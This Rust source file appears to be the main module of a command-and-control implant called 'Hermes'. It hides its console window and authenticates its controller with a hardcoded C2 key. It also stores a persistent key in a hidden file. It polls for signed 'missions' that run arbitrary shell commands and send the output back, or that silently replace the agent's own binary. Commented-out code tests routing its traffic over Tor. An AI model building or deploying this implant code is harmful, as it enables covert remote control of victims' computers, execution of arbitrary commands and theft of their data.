#![windows_subsystem = "windows"]
use std::{env, fs, path::Path, thread, time};

// use arti_client::{TorClient, TorClientConfig};
// use arti_hyper::ArtiHttpConnector;
use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::{crypto, model};
use log::{error, info};
// use futures::{Stream, StreamExt};
// use hyper::Body;
// use tls_api::{TlsConnector as TlsConnectorTrait, TlsConnectorBuilder};
// use tls_api_openssl::TlsConnector;

// #[cfg(debug_assertions)]
// struct MissionStream;

// #[cfg(not(debug_assertions))]
// struct MissionStream {
//     tor_client: TorClient<PreferredRuntime>,
// }

// #[cfg(not(debug_assertions))]
// impl MissionStream {
//     fn new() -> Self {
//         MissionStream {
//             tor_client: TorClient::create_bootstrapped(TorClientConfig::default()),
//         }
//     }
// }

// #[cfg(not(debug_assertions))]
// impl Stream for MissionStream {
//     type Item = Vec<Mission>;

//     fn poll_next(
//         self: std::pin::Pin<&mut Self>,
//         cx: &mut std::task::Context<'_>,
//     ) -> std::task::Poll<Option<Self::Item>> {
//         let http = hyper::Client::new();
//         let mut resp = http.get("localhost:3000".try_into()?).await?;
//         let mut resp = tokio::join!(http.get("localhost:3000".try_into()?));

//         println!("Status: {}", resp.status());
//         let body = hyper::body::to_bytes(resp.body_mut()).await?;
//         println!("Body: {}", std::str::from_utf8(&body)?);
//         cx.waker().wake_by_ref();
//         std::task::Poll::Pending
//     }
// }

// #[tokio::main]
// async fn main() -> anyhow::Result<()> {
//     println!("Starting Arti...");
//     let tor_client = TorClient::create_bootstrapped(TorClientConfig::default()).await?;

//     let tls_connector = TlsConnector::builder()?.build()?;

//     let tor_connector = ArtiHttpConnector::new(tor_client, tls_connector);
//     let http = hyper::Client::builder().build::<_, Body>(tor_connector);

//     println!("Requesting http://icanhazip.com via Tor...");
//     let mut resp = http.get("http://icanhazip.com".try_into()?).await?;
//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);

//     println!("Requesting http://icanhazip.com without Tor...");
//     let http = hyper::Client::new();
//     let mut resp = http.get("http://icanhazip.com".try_into()?).await?;
//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);

//     Ok(())
// }

mod client;
mod error;
mod platform;

type AgentResult<T> = Result<T, error::AgentError>;

const C2_VERIFYING_KEY: &str = "IX+xwv+SMQr4QZB8ba1n/fx3W3t5KvHQoCtBJ5HJZuk=";

fn failsafe_loop(
    signing_key: &mut crypto::SigningKey,
    c2_verifying_key: &crypto::VerifyingKey,
    agent_path: &std::path::Path,
) -> AgentResult<()> {
    loop {
        if let Some(mission) = client::missions::get_next(signing_key, &c2_verifying_key)? {
            match &mission.task {
                model::Task::Update(data) => {
                    info!("Updating agent '{}'", agent_path.display());
                    let new_agent_path = agent_path.with_file_name("agent.new");
                    fs::write(&new_agent_path, data)?;
                    self_replace::self_replace(&new_agent_path)?;
                    fs::remove_file(&new_agent_path)?;
                    platform::execute_detached(&agent_path, mission)
                        .expect("Failed to restart the agent");
                    break;
                }
                model::Task::Execute(command) => {
                    info!("Executing command: {command}");
                    let output = match platform::execute_cmd(command) {
                        Ok(output) => output.stdout,
                        Err(e) => e.to_string().as_bytes().to_vec(),
                    };
                    client::missions::report(
                        signing_key,
                        mission,
                        &String::from_utf8(output).unwrap(),
                    )?;
                }
                model::Task::Stop => {
                    client::missions::report(signing_key, mission, "OK")?;
                    break;
                }
            }
        }
    }
    Ok(())
}

pub fn signing_key() -> AgentResult<crypto::SigningKey> {
    let signing_key_path = dirs::data_local_dir().unwrap().join(Path::new(".hermes"));
    let signing_key = if Path::new(&signing_key_path).exists() {
        crypto::get_signing_key_from(fs::read(&signing_key_path)?.as_slice().try_into().unwrap())
    } else {
        let signing_key = crypto::get_signing_key();
        fs::write(&signing_key_path, signing_key.as_bytes())?;
        signing_key
    };
    Ok(signing_key)
}

fn main() -> AgentResult<()> {
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "info");
    }
    env_logger::init();
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓██████████████▓▒░░▒▓████████▓▒░░▒▓███████▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░       ");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░       ");
    info!("░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░  ░▒▓██████▓▒░ ");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ");
    let agent_path = env::current_exe()?;

    let mut signing_key = signing_key()?;
    let c2_verifying_key = crypto::VerifyingKey::from_bytes(
        BASE64_STANDARD
            .decode(C2_VERIFYING_KEY)?
            .as_slice()
            .try_into()
            .unwrap(),
    )
    .unwrap();

    if let Some(mission) = std::env::args().skip(1).next() {
        let mission: model::Mission = serde_json::from_str(&mission)?;
        info!("Agent restarted by mission [{}]", mission.id);
        client::missions::report(&mut signing_key, mission, "OK")?;
    }

    while let Err(e) = failsafe_loop(&mut signing_key, &c2_verifying_key, &agent_path) {
        error!("Error: {e}");
        thread::sleep(time::Duration::from_secs(5));
    }
    info!("Stopping agent");
    Ok(())
}
